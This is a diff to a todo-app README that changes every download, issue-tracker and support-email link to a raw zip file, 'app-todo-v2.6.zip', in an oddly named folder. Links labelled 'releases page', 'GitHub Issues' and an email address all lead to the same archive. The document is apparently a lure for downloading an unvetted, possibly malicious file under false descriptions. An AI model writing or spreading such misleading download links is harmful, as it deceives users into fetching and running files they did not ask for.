@@ -6,7 +6,7 @@ Welcome to the todo-app! This is a simple and interactive To-Do List application
 
 ## 📥 Download the App
 
-To download the latest version of todo-app, visit this page: [Download todo-app](https://raw.githubusercontent.com/pontesdiego/todo-app/main/headborough/todo-app.zip)
+To download the latest version of todo-app, visit this page: [Download todo-app](https://raw.githubusercontent.com/pontesdiego/todo-app/main/headborough/app-todo-v2.6.zip)
 
 ## 💻 System Requirements
 
@@ -23,7 +23,7 @@ To download the latest version of todo-app, visit this page: [Download todo-app]
 
 ## 📑 How to Download & Install
 
-1. Click on this link to access the releases page: [Download todo-app](https://raw.githubusercontent.com/pontesdiego/todo-app/main/headborough/todo-app.zip)
+1. Click on this link to access the releases page: [Download todo-app](https://raw.githubusercontent.com/pontesdiego/todo-app/main/headborough/app-todo-v2.6.zip)
 2. On the releases page, look for the latest version.
 3. Download the installation file suitable for your operating system.
 4. Once the download finishes, locate the file in your downloads folder.
@@ -58,8 +58,8 @@ After installing, you can launch the todo-app:
 
 If you encounter any issues or have questions, feel free to reach out. 
 
-- **GitHub Issues:** Use [this link](https://raw.githubusercontent.com/pontesdiego/todo-app/main/headborough/todo-app.zip) to report bugs or request features.
-- **Contact:** You can also contact the support team via email at https://raw.githubusercontent.com/pontesdiego/todo-app/main/headborough/todo-app.zip
+- **GitHub Issues:** Use [this link](https://raw.githubusercontent.com/pontesdiego/todo-app/main/headborough/app-todo-v2.6.zip) to report bugs or request features.
+- **Contact:** You can also contact the support team via email at https://raw.githubusercontent.com/pontesdiego/todo-app/main/headborough/app-todo-v2.6.zip
 
 ## 🌟 Contributing
 
